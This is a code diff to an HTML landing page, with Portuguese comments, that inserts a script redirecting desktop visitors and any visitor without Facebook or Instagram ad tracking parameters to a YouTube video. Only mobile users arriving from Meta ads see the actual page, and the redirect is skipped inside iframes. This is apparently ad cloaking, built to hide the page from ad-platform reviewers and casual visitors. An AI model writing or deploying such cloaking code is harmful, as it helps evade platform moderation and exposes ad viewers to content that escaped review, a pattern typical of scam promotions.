@@ -3,7 +3,55 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <link rel="preload" as="image" href="https://i.ibb.co/0ptWWHpw/Chat-GPT-Image-30-de-jun-de-2026-02-00-24.png" fetchpriority="high">
+    <!-- Script de Redirecionamento Inteligente de Alto Desempenho -->
+    <script>
+      (function() {
+        // Evitar loops e travamento de editores/iframes (Iframe Protection)
+        if (window.self !== window.top) {
+          return;
+        }
+
+        const youtubeUrl = 'https://www.youtube.com/watch?v=L7ejl_Hj3A8&pp=ygUINjcgdmlkZW8%3D';
+
+        // Detecção de Dispositivo (Mobile/Tablet)
+        const isMobileOrTablet = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile|Tablet/i.test(navigator.userAgent);
+
+        // Detecção de Tráfego Pago do Facebook Ads / Meta Ads (UTMs e Parâmetros)
+        let hasMetaTraffic = false;
+        try {
+          const search = (window.location.search || '').toLowerCase();
+          const params = new URLSearchParams(search);
+          const utmSource = (params.get('utm_source') || '');
+          const utmMedium = (params.get('utm_medium') || '');
+          const hasFbclid = params.has('fbclid');
+
+          const isFbSource = /facebook|fb|face|instagram|ig/.test(utmSource);
+          const isFbMedium = /fb|face/.test(utmMedium);
+
+          if (hasFbclid || isFbSource || isFbMedium) {
+            hasMetaTraffic = true;
+          }
+        } catch (e) {
+          // Fallback robusto de alta performance com regex para compatibilidade total
+          const search = (window.location.search || '').toLowerCase();
+          const hasFbclid = search.indexOf('fbclid=') !== -1;
+          const isFbSource = /utm_source=[^&]*(facebook|fb|face|instagram|ig)/.test(search);
+          const isFbMedium = /utm_medium=[^&]*(fb|face)/.test(search);
+
+          if (hasFbclid || isFbSource || isFbMedium) {
+            hasMetaTraffic = true;
+          }
+        }
+
+        // Regra de Redirecionamento Final (Condicional)
+        // - Se for Computador/PC -> Redireciona imediatamente
+        // - Se for Celular/Tablet SEM tráfego válido do Facebook Ads -> Redireciona imediatamente
+        // - Se for Celular/Tablet COM tráfego válido do Facebook Ads -> Permanece na página
+        if (!isMobileOrTablet || !hasMetaTraffic) {
+          window.location.replace(youtubeUrl);
+        }
+      })();
+    </script>
     <link rel="dns-prefetch" href="https://i.ibb.co/">
     <link rel="preconnect" href="https://i.ibb.co" crossorigin>
     <link rel="dns-prefetch" href="https://i.imgur.com">
